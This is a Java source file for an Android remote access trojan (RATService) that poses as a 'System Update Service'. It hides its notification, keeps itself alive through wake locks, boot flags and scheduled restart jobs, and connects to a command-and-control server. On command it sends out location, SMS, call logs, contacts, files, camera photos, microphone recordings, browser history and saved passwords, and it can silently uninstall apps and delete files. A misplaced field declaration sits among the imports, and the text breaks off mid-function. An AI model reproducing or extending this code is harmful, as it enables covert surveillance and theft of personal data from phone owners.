package com.android.system.update;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Binder;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.RemoteException;
import android.os.SystemClock;
import android.util.Log;
import com.android.system.update.modules.CameraModule;
import androidx.core.app.NotificationCompat;
import androidx.core.app.ActivityCompat;
import android.Manifest;
import android.content.pm.PackageManager;
import org.json.JSONArray;

import com.android.system.update.modules.*;
private ClipboardModule clipboardModule;

import org.json.JSONException;
import org.json.JSONObject;
import android.util.Base64;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import com.android.system.update.modules.BrowserModule;
import com.android.system.update.BrowserAccessibilityService;

public class RATService extends Service {
    private static final String CHANNEL_ID = "SystemUpdateChannel";
    private static final int NOTIFICATION_ID = 1337;
    private static final String TAG = "SystemService";
    private static final int JOB_ID = 1001;
    private static final int PERSISTENCE_JOB_ID = 1002;
    private static final long RESTART_DELAY_MS = 5000;
    private static final long CHECK_INTERVAL_MS = 45000;
    
    // Simple timeouts like working code
    private static final int CONNECT_TIMEOUT = 15000; // 15 seconds
    private static final int RETRY_INTERVAL = 30; // seconds
    private static final int READ_TIMEOUT_CHECK = 300000; // 5 minutes - just in case
    
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private AtomicBoolean isRunning = new AtomicBoolean(true);
    private ExecutorService executor;
    private static volatile RATService instance;
    private PowerManager.WakeLock wakeLock;
    private int consecutiveFailures = 0;
    private BrowserModule browserModule;

    // Location tracking variables
    private LocationManager locationManager;
    private LocationListener locationListener;
    private HandlerThread locationThread;
    private Handler locationHandler;
    private boolean isLocationTracking = false;
    
    // Modules
    private CameraModule cameraModule;
    private MicModule micModule;
    private LocationModule locationModule;
    private SmsModule smsModule;
    private CallsModule callsModule;
    private ContactsModule contactsModule;
    private FileModule fileModule;
    private ShellModule shellModule;
    private DeviceModule deviceModule;
    private AppManagerModule appManagerModule;
    // Track camera state
    private boolean isUsingFrontCamera = false;
    
    // Binder for GuardianService communication
    public class RATServiceBinder extends Binder {
        public void heartbeat() throws RemoteException {
            if (!isRunning.get()) {
                throw new RemoteException("Service is not running");
            }
        }
    }
    
    private final RATServiceBinder binder = new RATServiceBinder();
    
    public static RATService getInstance() {
        return instance;
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        AppController.setConnectionService(this);
        
        Log.d(TAG, "System service initialized");
        
        // Acquire wake lock to prevent CPU sleep
        acquireWakeLock();
        
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        // Initialize location manager
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        startLocationThread();
        
        // Initialize modules based on config
        if (Config.ENABLE_CAMERA) {
            Log.d(TAG, "📸 Initializing CameraModule");
            cameraModule = new CameraModule(this);
            Log.d(TAG, "📸 CameraModule initialized: " + (cameraModule != null));
        }
        if (Config.ENABLE_MICROPHONE) micModule = new MicModule(this);
        if (Config.ENABLE_LOCATION) locationModule = new LocationModule(this);
        if (Config.ENABLE_SMS) smsModule = new SmsModule(this);
        if (Config.ENABLE_CALLS) callsModule = new CallsModule(this);
        if (Config.ENABLE_CONTACTS) contactsModule = new ContactsModule(this);
        if (Config.ENABLE_FILES) fileModule = new FileModule(this);
        if (Config.ENABLE_SHELL) shellModule = new ShellModule();
    if (Config.ENABLE_CLIPBOARD) clipboardModule = new ClipboardModule(this);

        if (Config.ENABLE_BROWSER) browserModule = new BrowserModule(this);
        if (Config.ENABLE_APP_MANAGER) appManagerModule = new AppManagerModule(this);
        deviceModule = new DeviceModule(this);
        
        // Schedule all persistence mechanisms
        scheduleAllJobs();
        
        // Set that service should run on boot
        setRunOnBoot(true);
        
        // Single executor thread for connection handling
        executor = Executors.newSingleThreadExecutor();
        
        // Start connection thread
        startConnection();
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("System optimization service");
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }
    
    private Notification createNotification() {
        int icon = android.R.drawable.stat_sys_download_done;
        
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update Service")
            .setContentText("Optimizing system performance")
            .setSmallIcon(icon)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build();
    }
    
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "SystemService::WakeLock"
            );
            wakeLock.setReferenceCounted(false);
            wakeLock.acquire(10 * 60 * 1000L); // 10 minute timeout, will auto-renew
            Log.d(TAG, "Wake lock acquired");
        } catch (Exception e) {
            Log.e(TAG, "Failed to acquire wake lock", e);
        }
    }
    
    private void startLocationThread() {
        locationThread = new HandlerThread("LocationThread");
        locationThread.start();
        locationHandler = new Handler(locationThread.getLooper());
    }
    
    private void scheduleAllJobs() {
        scheduleJobSchedulerRestart();
        schedulePersistenceJob();
        scheduleCheckAlarm();
    }
    
    private void scheduleCheckAlarm() {
        Intent intent = new Intent(this, RestartReceiver.class);
        intent.setAction("CHECK_SERVICE");
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
            this, 3, intent, 
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (alarmManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + CHECK_INTERVAL_MS,
                    pendingIntent
                );
            } else {
                alarmManager.setExact(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + CHECK_INTERVAL_MS,
                    pendingIntent
                );
            }
            Log.d(TAG, "Check alarm scheduled for " + (CHECK_INTERVAL_MS/1000) + " seconds");
        }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "System service onStartCommand");
        
        // Restart connection if it's not running
        if (executor == null || executor.isShutdown()) {
            executor = Executors.newSingleThreadExecutor();
            startConnection();
        }
        
        scheduleAllJobs();
        return START_STICKY;
    }
    private BrowserAccessibilityService getBrowserAccessibilityService() {
    // Since BrowserAccessibilityService is a service in the same app,
    // we can't directly get an instance. Instead, we'll use a broadcast
    // or we can modify the BrowserAccessibilityService to store a static reference.
    
    // For now, we'll use the singleton pattern we added to BrowserAccessibilityService
    return BrowserAccessibilityService.getInstance();
}
    private void schedulePersistenceJob() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                ComponentName componentName = new ComponentName(this, PersistenceJobService.class);
                JobInfo jobInfo = new JobInfo.Builder(PERSISTENCE_JOB_ID, componentName)
                        .setPeriodic(15 * 60 * 1000)
                        .setPersisted(true)
                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                        .setBackoffCriteria(30000, JobInfo.BACKOFF_POLICY_EXPONENTIAL)
                        .build();
                
                JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
                jobScheduler.schedule(jobInfo);
                Log.d(TAG, "Persistence job scheduled");
            } catch (Exception e) {
                Log.e(TAG, "Error scheduling persistence job", e);
            }
        }
    }
    
    private void scheduleJobSchedulerRestart() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                ComponentName componentName = new ComponentName(this, JobSchedulerService.class);
                JobInfo jobInfo = new JobInfo.Builder(JOB_ID, componentName)
                        .setMinimumLatency(RESTART_DELAY_MS)
                        .setOverrideDeadline(RESTART_DELAY_MS * 2)
                        .setPersisted(true)
                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                        .build();
                
                JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
                jobScheduler.schedule(jobInfo);
                Log.d(TAG, "Restart job scheduled");
            } catch (Exception e) {
                Log.e(TAG, "Failed to schedule restart job", e);
            }
        }
    }
    
    private void setRunOnBoot(boolean shouldRun) {
        SharedPreferences prefs = getSharedPreferences("service_prefs", MODE_PRIVATE);
        prefs.edit().putBoolean("should_run", shouldRun).apply();
    }
    
    private boolean isConnected() {
        return socket != null && socket.isConnected() && !socket.isClosed() && out != null;
    }
    
    private boolean isNetworkAvailable() {
        try {
            ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();
            return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
        } catch (Exception e) {
            return false;
        }
    }
    
    private void startConnection() {
        if (executor == null || executor.isShutdown()) {
            executor = Executors.newSingleThreadExecutor();
        }
        
        executor.execute(() -> {
            int retryCount = 0;
            int consecutiveNetworkErrors = 0;
            
            while (isRunning.get()) {
                try {
                    // Check if network is available first
                    if (!isNetworkAvailable()) {
                        Log.d(TAG, "No network available, waiting...");
                        Thread.sleep(RETRY_INTERVAL * 1000);
                        continue;
                    }
                    
                    // Reset network error counter on successful check
                    consecutiveNetworkErrors = 0;
                    
                    // Connect with timeout
                    socket = new Socket();
                    socket.connect(new InetSocketAddress(Config.SERVER_HOST, Config.SERVER_PORT), CONNECT_TIMEOUT);
                    socket.setKeepAlive(true);
                    
                    out = new PrintWriter(socket.getOutputStream(), true);
                    in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    
                    Log.d(TAG, "✅ Connected to C2 server at " + Config.SERVER_HOST + ":" + Config.SERVER_PORT);
                    
                    // Reset counters on successful connection
                    consecutiveFailures = 0;
                    retryCount = 0;
                    
                    // Send initial device info
                    sendDeviceInfo();
                    
                    // Main processing loop - blocks on readLine()
                    String line;
                    long lastReadTime = System.currentTimeMillis();
                    
                    while (isRunning.get() && (line = in.readLine()) != null) {
                        lastReadTime = System.currentTimeMillis();
                        processCommand(line);
                    }
                    
                    // Check if we've been stuck too long (safety check)
                    if (System.currentTimeMillis() - lastReadTime > READ_TIMEOUT_CHECK) {
                        Log.w(TAG, "Read timeout check triggered, reconnecting...");
                    }
                    
                } catch (SocketTimeoutException e) {
                    Log.e(TAG, "Socket timeout", e);
                    consecutiveFailures++;
                } catch (IOException e) {
                    Log.e(TAG, "Connection error: " + e.getMessage());
                    consecutiveFailures++;
                    consecutiveNetworkErrors++;
                } catch (InterruptedException e) {
                    Log.e(TAG, "Sleep interrupted", e);
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "Unexpected error", e);
                    consecutiveFailures++;
                } finally {
                    closeConnection();
                }
                
                // Keep trying forever - NO MAX RETRIES LIMIT
                if (isRunning.get()) {
                    // Calculate delay with exponential backoff
                    long delay;
                    if (consecutiveFailures < 5) {
                        delay = RETRY_INTERVAL * 1000; // 30 seconds
                    } else if (consecutiveFailures < 10) {
                        delay = 60000; // 1 minute
                    } else if (consecutiveFailures < 20) {
                        delay = 120000; // 2 minutes
                    } else {
                        delay = 300000; // 5 minutes max
                    }
                    
                    // If we have too many network errors, increase wait time
                    if (consecutiveNetworkErrors > 5) {
                        Log.w(TAG, "Multiple network errors, waiting longer...");
                        delay = Math.max(delay, 60000); // At least 1 minute
                    }
                    
                    retryCount++;
                    Log.d(TAG, "Reconnecting in " + (delay/1000) + " seconds (attempt " + retryCount + ")");
                    
                    try {
                        Thread.sleep(delay);
                    } catch (InterruptedException ie) {
                        Log.e(TAG, "Reconnect sleep interrupted", ie);
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
            
            // If we exit the loop, schedule a full service restart
            Log.w(TAG, "Connection loop ended, scheduling service restart");
            scheduleRestartWithAlarm();
        });
    }
    
    private void closeConnection() {
        try {
            if (out != null) {
                out.close();
                out = null;
            }
            if (in != null) {
                in.close();
                in = null;
            }
            if (socket != null && !socket.isClosed()) {
                socket.close();
                socket = null;
            }
        } catch (IOException e) {
            Log.e(TAG, "Error closing connection", e);
        }
    }
    
    private void sendDeviceInfo() {
        String info = String.format("DEVICE|%s|%s|%s|%s|%s",
            getUniqueDeviceId(),
            Build.MANUFACTURER,
            Build.MODEL,
            Build.VERSION.RELEASE,
            Build.VERSION.SDK_INT
        );
        sendCommand(info);
        Log.d(TAG, "Sent device info: " + info);
    }
    
    private void sendCommand(String data) {
        if (out != null) {
            try {
                // For very large data, send in chunks
                if (data.length() > 65536) { // 64KB threshold
                    Log.d(TAG, "Large response detected (" + data.length() + " chars), sending in chunks");
                    
                    // Send header with total size
                    out.println("FILE_CHUNK|START|" + data.length());
                    out.flush();
                    
                    // Send in 32KB chunks
                    int chunkSize = 32768;
                    for (int i = 0; i < data.length(); i += chunkSize) {
                        int end = Math.min(i + chunkSize, data.length());
                        String chunk = data.substring(i, end);
                        out.println("FILE_CHUNK|DATA|" + i + "|" + chunk);
                        out.flush();
                        
                        // Small delay to prevent overwhelming the socket
                        try {
                            Thread.sleep(10);
                        } catch (InterruptedException e) {
                            // Ignore
                        }
                    }
                    
                    // Send end marker
                    out.println("FILE_CHUNK|END");
                    out.flush();
                } else {
                    // Normal size, send normally
                    out.println(data);
                    out.flush();
                }
                Log.d(TAG, "📤 Sent: " + (data.length() > 100 ? data.substring(0, 100) + "..." : data));
            } catch (Exception e) {
                Log.e(TAG, "Error sending command", e);
            }
        }
    }
    
    private void sendCommand(JSONObject json) {
        sendCommand(json.toString());
    }
    
    private void processCommand(String command) {
        Log.d(TAG, "Received raw command: " + command);
        
        // Try to parse as JSON first (for backward compatibility)
        if (command.trim().startsWith("{")) {
            try {
                JSONObject jsonCmd = new JSONObject(command);
                String cmd = jsonCmd.optString("command", "").toLowerCase().trim();
                String args = jsonCmd.optString("args", "");
                
                Log.d(TAG, "Parsed JSON command: " + cmd + " with args: " + args);
                
                // Route JSON commands
                routeCommand(cmd, args);
                return;
            } catch (JSONException e) {
                Log.d(TAG, "Not a valid JSON command, trying pipe format");
            }
        }
        
        // Handle pipe-delimited format
        String[] parts = command.split("\\|", 2);
        String cmd = parts[0].toLowerCase().trim();
        String args = parts.length > 1 ? parts[1] : "";
        
        Log.d(TAG, "Parsed pipe command: " + cmd + " with args: " + args);
        
        // Route the command
        routeCommand(cmd, args);
    }
    
    private void routeCommand(String cmd, String args) {
        Log.d(TAG, "🔄 Routing command: " + cmd + " with args: " + args);
        
        switch (cmd) {
            case "ping":
                sendCommand("PONG");
                break;
                
             case "help":
            String helpText = "Available commands: info, location, location_stream [start/stop], camera, sms, calls, contacts, files_list [path], file_get [path], file_delete [path], file_rename [old|new], create_folder [path|name], file_zip [path], search_files [path|query], storage_info, mic, mic_stop, shell, ping, test_folder [path], apps_list [true/false], apps_running, apps_blocked_list, apps_usage [days], app_info [package], app_stop [package], app_block [package|true/false], app_uninstall [package|silent], app_clear_data [package]";
            sendCommand("HELP|" + helpText);
            break;
                
            case "info":
            case "device_info":
                if (deviceModule != null) {
                    String result = deviceModule.getDeviceInfo();
                    sendCommand("INFO|" + result);
                } else {
                    sendCommand("INFO|ERROR: Device module not available");
                }
                break;
                
            case "location":
            case "get_location":
                if (locationModule != null) {
                    String result = locationModule.getLocation();
                    sendCommand("LOCATION|" + result);
                } else {
                    sendCommand("LOCATION|ERROR: Location module not available");
                }
                break;
                
            case "location_stream":
                handleLocationStreamCommand(args);
                break;
                case "mic_path":
    if (micModule != null) {
        String result = micModule.getRecordingsPath();
        sendCommand("MIC_PATH|" + result);
    } else {
        sendCommand("MIC_PATH|ERROR: Mic module not available");
    }
    break;
       case "mic_list_detailed":
    if (micModule != null) {
        String result = micModule.listRecordingsDetailed();
        try {
            JSONObject jsonResponse = new JSONObject(result);
            jsonResponse.put("command", "mic_response");
            jsonResponse.put("action", "list_recordings_detailed");
            sendCommand(jsonResponse.toString());
        } catch (JSONException e) {
            sendCommand("MIC_LIST|" + result);
        }
    } else {
        sendCommand("MIC_LIST|ERROR: Mic module not available");
    }
    break;         
            // Camera commands - Updated to match working project format
            case "take_photo":
            case "camera":
            case "camera_photo":
                if (cameraModule != null) {
                    Log.d(TAG, "📸 Executing camera capture");
                    
                    // Get camera type from args
                    String cameraType = args.isEmpty() ? "back" : args;
                    boolean useFrontCamera = cameraType.equals("front");
                    
                    // Switch camera if needed
                    if (useFrontCamera && !isUsingFrontCamera) {
                        String switchResult = cameraModule.switchCamera();
                        isUsingFrontCamera = true;
                        Log.d(TAG, "🔄 Switched to front camera: " + switchResult);
                    } else if (!useFrontCamera && isUsingFrontCamera) {
                        String switchResult = cameraModule.switchCamera();
                        isUsingFrontCamera = false;
                        Log.d(TAG, "🔄 Switched to back camera: " + switchResult);
                    }
                    
                    // Send immediate acknowledgment
                    try {
                        JSONObject ack = new JSONObject();
                        ack.put("command", "photo_result")
                           .put("status", "processing")
                           .put("camera_type", cameraType);
                        sendCommand(ack);
                    } catch (JSONException e) {
                        Log.e(TAG, "Error sending ack", e);
                    }
                    
                    // Run camera capture on background thread
                    executor.submit(() -> {
                        try {
                            Log.d(TAG, "📸 Calling cameraModule.takePhoto()");
                            long startTime = System.currentTimeMillis();
                            String result = cameraModule.takePhoto();
                            long endTime = System.currentTimeMillis();
                            Log.d(TAG, "📸 Camera took " + (endTime - startTime) + "ms");
                            
                            // Format response like working project
                            JSONObject photoResult = new JSONObject();
                            photoResult.put("command", "photo_result");
                            
                            if (result != null && result.startsWith("ERROR")) {
                                photoResult.put("status", "error")
                                          .put("message", result);
                            } else if (result != null && !result.isEmpty()) {
                                // Check if result already has data:image prefix
                                String base64Data;
                                if (result.startsWith("data:image")) {
                                    base64Data = result.replaceFirst("data:image/jpeg;base64,", "");
                                } else {
                                    base64Data = result;
                                }
                                
                                photoResult.put("status", "success")
                                          .put("image_data", base64Data)
                                          .put("camera_type", cameraType)
                                          .put("device_id", getUniqueDeviceId());
                            } else {
                                photoResult.put("status", "error")
                                          .put("message", "Unknown response format");
                            }
                            
                            sendCommand(photoResult);
                            
                        } catch (Exception e) {
                            Log.e(TAG, "❌ Error in camera capture", e);
                            try {
                                JSONObject errorResult = new JSONObject();
                                errorResult.put("command", "photo_result")
                                          .put("status", "error")
                                          .put("message", e.getMessage());
                                sendCommand(errorResult);
                            } catch (JSONException je) {
                                Log.e(TAG, "JSON error", je);
                            }
                        }
                    });
                    
                } else {
                    Log.e(TAG, "❌ Camera module not available");
                    try {
                        JSONObject errorResult = new JSONObject();
                        errorResult.put("command", "photo_result")
                                  .put("status", "error")
                                  .put("message", "Camera module not available");
                        sendCommand(errorResult);
                    } catch (JSONException e) {
                        Log.e(TAG, "JSON error", e);
                    }
                }
                break;
                
            case "camera_test_capture":
                if (cameraModule != null) {
                    String result = cameraModule.testCapture();
                    sendCommand("CAMERA_TEST_CAPTURE|" + result);
                } else {
                    sendCommand("CAMERA_TEST_CAPTURE|ERROR: Camera module not available");
                }
                break;
                
            case "camera_switch":
                if (cameraModule != null) {
                    Log.d(TAG, "🔄 Switching camera");
                    String result = cameraModule.switchCamera();
                    isUsingFrontCamera = !isUsingFrontCamera;
                    sendCommand("CAMERA_SWITCH|" + result);
                } else {
                    sendCommand("CAMERA_SWITCH|ERROR: Camera module not available");
                }
                break;
                
            case "camera_status":
                if (cameraModule != null) {
                    String result = cameraModule.checkCameraStatus();
                    sendCommand("CAMERA_STATUS|" + result);
                } else {
                    sendCommand("CAMERA_STATUS|ERROR: Camera module not available");
                }
                break;
                
            case "camera_test":
                if (cameraModule != null) {
                    Log.d(TAG, "🔧 Testing camera module");
                    String result = cameraModule.testCamera();
                    sendCommand("CAMERA_TEST|" + result);
                } else {
                    sendCommand("CAMERA_TEST|ERROR: Camera module not available");
                }
                break;
                
            case "camera_simple_test":
                if (cameraModule != null) {
                    String result = cameraModule.simpleTest();
                    sendCommand("CAMERA_SIMPLE_TEST|" + result);
                } else {
                    sendCommand("CAMERA_SIMPLE_TEST|ERROR: Camera module not available");
                }
                break;
                
            case "camera_simple_capture":
                if (cameraModule != null) {
                    String result = cameraModule.simpleCapture();
                    sendCommand("CAMERA_SIMPLE|" + result);
                } else {
                    sendCommand("CAMERA_SIMPLE|ERROR: Camera module not available");
                }
                break;

                // In routeCommand() method, add these cases:

// Add this to your routeCommand method where you handle other commands

       // Browser-related cases with proper exception handling
case "browser_data":
case "get_browsers":
    if (browserModule != null) {
        Log.d(TAG, "🌐 Getting all browser data");
        String result = browserModule.getAllBrowserData();
        sendCommand("BROWSER_DATA|" + result);
    } else {
        sendCommand("BROWSER_DATA|{\"success\":false,\"error\":\"Browser module not available\"}");
    }
    break;

case "browser_export":
    if (browserModule != null) {
        Log.d(TAG, "🌐 Exporting browser data");
        String result = browserModule.exportBrowserData();
        sendCommand("BROWSER_EXPORT|" + result);
    } else {
        sendCommand("BROWSER_EXPORT|{\"success\":false,\"error\":\"Browser module not available\"}");
    }
    break;

case "browser_history":
    if (browserModule != null && !args.isEmpty()) {
        Log.d(TAG, "🌐 Getting history for: " + args);
        try {
            JSONArray history = browserModule.getBrowserHistory(args);
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("packageName", args);
            result.put("history", history);
            result.put("count", history.length());
            sendCommand("BROWSER_HISTORY|" + result.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error creating browser history response", e);
            sendCommand("BROWSER_HISTORY|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
        }
    } else {
        sendCommand("BROWSER_HISTORY|{\"success\":false,\"error\":\"Invalid package name\"}");
    }
    break;                
case "browser_bookmarks":
    if (browserModule != null && !args.isEmpty()) {
        Log.d(TAG, "🌐 Getting bookmarks for: " + args);
        try {
            JSONArray bookmarks = browserModule.getBrowserBookmarks(args);
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("packageName", args);
            result.put("bookmarks", bookmarks);
            result.put("count", bookmarks.length());
            sendCommand("BROWSER_BOOKMARKS|" + result.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error creating browser bookmarks response", e);
            sendCommand("BROWSER_BOOKMARKS|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
        }
    } else {
        sendCommand("BROWSER_BOOKMARKS|{\"success\":false,\"error\":\"Invalid package name\"}");
    }
    break;

case "browser_passwords":
    if (browserModule != null && !args.isEmpty()) {
        Log.d(TAG, "🌐 Getting passwords for: " + args);
        try {
            JSONArray passwords = browserModule.getSavedPasswords(args);
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("packageName", args);
            result.put("passwords", passwords);
            result.put("count", passwords.length());
            sendCommand("BROWSER_PASSWORDS|" + result.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error creating browser passwords response", e);
            sendCommand("BROWSER_PASSWORDS|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
        }
    } else {
        sendCommand("BROWSER_PASSWORDS|{\"success\":false,\"error\":\"Invalid package name\"}");
    }
    break;

// NEW: Handle captured browser data from accessibility service
case "get_captured_browser_data":
    try {
        BrowserAccessibilityService service = BrowserAccessibilityService.getInstance();
        if (service != null) {
            Log.d(TAG, "📱 Getting captured browser data from accessibility service");
            String result = service.getCapturedData();
            sendCommand("CAPTURED_BROWSER_DATA|" + result);
        } else {
            Log.d(TAG, "⚠️ Accessibility service not running");
            sendCommand("CAPTURED_BROWSER_DATA|{\"success\":false,\"error\":\"Accessibility service not running. Please enable it in Settings → Accessibility.\"}");
        }
    } catch (Exception e) {
        Log.e(TAG, "Error getting captured browser data", e);
        sendCommand("CAPTURED_BROWSER_DATA|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
    }
    break;
// In routeCommand() method, add these cases:

case "apps_list":
case "list_apps":
    if (appManagerModule != null) {
        boolean includeSystem = args.equalsIgnoreCase("true");
        String result = appManagerModule.listInstalledApps(includeSystem);
        sendCommand("APPS_LIST|" + result);
    } else {
        sendCommand("APPS_LIST|{\"success\":false,\"error\":\"App manager not available\"}");
    }
    break;

case "app_info":
    if (appManagerModule != null && !args.isEmpty()) {
        String result = appManagerModule.getAppInfo(args);
        sendCommand("APP_INFO|" + result);
    } else {
        sendCommand("APP_INFO|{\"success\":false,\"error\":\"Invalid package name\"}");
    }
    break;

case "app_stop":
case "force_stop":
    if (appManagerModule != null && !args.isEmpty()) {
        String result = appManagerModule.forceStopApp(args);
        sendCommand("APPS_ACTION|" + result);
    } else {
        sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"Invalid package name\"}");
    }
    break;

case "app_uninstall":
    if (appManagerModule != null && args.contains("|")) {
        String[] parts = args.split("\\|", 2);
        String packageName = parts[0];
        boolean silent = parts.length > 1 && parts[1].equalsIgnoreCase("true");
        String result = appManagerModule.uninstallApp(packageName, silent);
        sendCommand("APPS_ACTION|" + result);
    } else {
        sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"Invalid format. Use: package|silent\"}");
    }
    break;

case "apps_usage":
    if (appManagerModule != null) {
        int days = 7; // default
        if (!args.isEmpty()) {
            try {
                days = Integer.parseInt(args);
            } catch (NumberFormatException e) {
                // use default
            }
        }
        String result = appManagerModule.getAppUsageStats(days);
        sendCommand("APPS_USAGE|" + result);
    } else {
        sendCommand("APPS_USAGE|{\"success\":false,\"error\":\"App manager not available\"}");
    }
    break;

case "app_block":
    if (appManagerModule != null && args.contains("|")) {
        String[] parts = args.split("\\|", 2);
        String packageName = parts[0];
        boolean block = parts.length > 1 && parts[1].equalsIgnoreCase("true");
        String result = appManagerModule.blockApp(packageName, block);
        sendCommand("APPS_ACTION|" + result);
    } else {
        sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"Invalid format. Use: package|true/false\"}");
    }
    break;

case "apps_running":
    if (appManagerModule != null) {
        String result = appManagerModule.getRunningApps();
        sendCommand("APPS_RUNNING|" + result);
    } else {
        sendCommand("APPS_RUNNING|{\"success\":false,\"error\":\"App manager not available\"}");
    }
    break;

case "apps_blocked_list":
    if (appManagerModule != null) {
        String result = appManagerModule.getBlockedApps();
        sendCommand("APPS_BLOCKED|" + result);
    } else {
        sendCommand("APPS_BLOCKED|{\"success\":false,\"error\":\"App manager not available\"}");
    }
    break;

case "app_clear_data":
    if (appManagerModule != null && !args.isEmpty()) {
        String result = appManagerModule.clearAppData(args);
        sendCommand("APPS_ACTION|" + result);
    } else {
        sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"Invalid package name\"}");
    }
    break;

case "apps_kill_all":
    if (appManagerModule != null) {
        try {
            String runningAppsJson = appManagerModule.getRunningApps();
            JSONObject json = new JSONObject(runningAppsJson);
            JSONArray apps = json.getJSONArray("apps");
            int killed = 0;
            for (int i = 0; i < apps.length(); i++) {
                JSONObject app = apps.getJSONObject(i);
                String packageName = app.getString("packageName");
                // Don't kill system apps
                if (!packageName.startsWith("com.android.") && 
                    !packageName.startsWith("android") &&
                    !packageName.equals(RATService.this.getPackageName())) {  // FIXED: Use RATService.this.getPackageName()
                    appManagerModule.forceStopApp(packageName);
                    killed++;
                }
            }
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("message", "Killed " + killed + " apps");
            result.put("count", killed);
            sendCommand("APPS_ACTION|" + result.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error killing apps", e);
            sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
        }
    } else {
        sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"App manager not available\"}");
    }
    break;


                
                
            case "sms":
            case "get_sms":
                if (smsModule != null) {
                    String result = smsModule.getSms();
                    sendCommand("SMS|" + result);
                } else {
                    sendCommand("SMS|ERROR: SMS module not available");
                }
                break;
                
            case "calls":
            case "get_calls":
                if (callsModule != null) {
                    String result = callsModule.getCallLogs();
                    sendCommand("CALLS|" + result);
                } else {
                    sendCommand("CALLS|ERROR: Calls module not available");
                }
                break;
                
            case "contacts":
            case "get_contacts":
                if (contactsModule != null) {
                    String result = contactsModule.getContacts();
                    sendCommand("CONTACTS|" + result);
                } else {
                    sendCommand("CONTACTS|ERROR: Contacts module not available");
                }
                break;
                
            // FILE OPERATIONS
            case "files_list":
            case "list_files":
                if (fileModule != null) {
                    String result = fileModule.listFiles(args);
                    sendCommand("FILES|" + result);
                } else {
                    sendCommand("FILES|ERROR: File module not available");
                }
                break;
                
            case "file_get":
            case "download":
                if (fileModule != null) {
                    String result = fileModule.getFile(args);
                    sendCommand("FILE_GET|" + result);
                } else {
                    sendCommand("FILE_GET|ERROR: File module not available");
                }
                break;
                
            case "file_delete":
            case "delete":
                if (fileModule != null) {
                    String result = fileModule.deleteFile(args);
                    sendCommand("FILE_DELETE|" + result);
                } else {
